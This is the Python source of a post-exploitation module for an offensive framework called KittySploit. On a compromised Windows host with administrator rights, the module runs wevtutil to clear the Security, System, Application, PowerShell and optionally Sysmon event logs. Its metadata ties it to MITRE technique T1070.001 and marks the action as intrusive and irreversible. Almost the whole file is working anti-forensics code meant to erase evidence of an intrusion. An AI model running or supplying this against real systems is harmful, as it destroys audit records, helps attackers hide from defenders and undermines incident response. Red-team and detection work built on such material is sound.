#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re

from kittysploit import *

from lib.post.windows.session import WindowsSessionMixin


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows Clear Event Logs",
        "description": (
            "Clear Security, System, Application and PowerShell operational logs "
            "via wevtutil. Generates high-visibility events (1102/104)."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1070/001/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.5,
            "noise": 0.7,
            "value": 1.1,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {"consumes_capabilities": ["shell"], "produces_capabilities": []},
        },
    }

    logs = OptString(
        "Security,System,Application,Windows PowerShell,Microsoft-Windows-PowerShell/Operational",
        "Comma-separated log names to clear",
        False,
    )
    include_sysmon = OptBool(False, "Also clear Microsoft-Windows-Sysmon/Operational", False)

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_is_admin():
            print_error("Administrator privileges are required.")
            return False

        names = [x.strip() for x in str(self.logs or "").split(",") if x.strip()]
        if self.include_sysmon:
            names.append("Microsoft-Windows-Sysmon/Operational")

        print_warning("Clearing logs triggers Event ID 1102/104 — defenders often alert on this.")
        ok = True
        for log in names:
            out = self.win_execute(f'wevtutil cl "{log}"', timeout=20)
            if out and re.search(r"error|failed|accès refusé|access is denied", out, re.I):
                print_warning(f"wevtutil cl {log}: {out}")
                ok = False
            else:
                print_status(f"Cleared log: {log}")
        return ok
